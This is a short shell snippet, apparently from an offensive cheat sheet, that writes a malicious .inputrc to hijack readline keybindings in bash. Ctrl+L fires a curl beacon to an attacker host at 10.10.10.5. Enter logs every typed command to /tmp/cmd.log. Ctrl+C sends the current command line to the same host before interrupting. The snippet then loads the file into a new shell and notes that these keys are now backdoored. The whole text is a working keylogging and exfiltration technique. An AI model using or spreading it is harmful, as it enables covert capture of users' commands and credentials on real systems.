```sh -cwn
# INPUTRC - Hijack readline keybindings
$ cat > /tmp/.inputrc << 'EOF'
# Ctrl+L clears screen AND runs payload
"\C-l": "\C-uclear; curl -s http://10.10.10.5/beacon\C-m"
# Enter key logs command before executing
RETURN: "\C-e | tee -a /tmp/cmd.log\C-m"
# Ctrl+C sends command to attacker before SIGINT
"\C-c": "\C-a\C-k curl -s 'http://10.10.10.5/abort?c=\C-y' &\C-m\C-c"
EOF
$ export INPUTRC=/tmp/.inputrc
$ bash  # New shell loads evil inputrc
# Every Enter, Ctrl+C, Ctrl+L now backdoored
```


